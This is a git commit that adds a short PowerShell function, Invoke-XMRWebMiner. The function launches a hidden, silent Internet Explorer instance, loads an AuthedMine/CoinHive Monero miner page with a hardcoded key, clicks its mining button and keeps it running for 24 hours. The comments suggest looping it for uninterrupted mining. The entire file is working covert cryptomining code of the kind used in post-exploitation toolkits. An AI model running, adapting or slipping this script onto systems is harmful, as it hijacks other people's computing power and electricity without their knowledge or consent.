3cfa4f33b85dc17fbc381215827422d76234d197
Steve Borosh <rvrsh3ll@users.noreply.github.com>
2018-01-12 14:46:59 -0500

    Create Invoke-XMRWebMiner.ps1

---
+++ Invoke-XMRWebMiner.ps1
@@ -0,0 +1,17 @@
+function Invoke-XMRWebMiner {
+
+$ie=New-Object -comobject InternetExplorer.Application
+$ie.visible = $False
+$ie.Silent = $true
+$ie.navigate('https://authedmine.com/media/miner.html?key=hc0bDnCskaupNOIb2cWVZQMPswLeo3Iv#')
+while($ie.busy){Start-Sleep 3}
+$link = @($ie.Document.documentElement.getElementsByClassName(("mining-button")))
+$link.click()
+while ($ie.Busy) {
+    # CoinHive will only run your miner for 24hrs at a time. So, we time it and cleanly exit internet explorer after 24 hours.
+    # You could loop this to restart if you wanted to mine uninterrupted.
+    [System.Threading.Thread]::Sleep(86400)
+}
+$ie.quit
+}
+
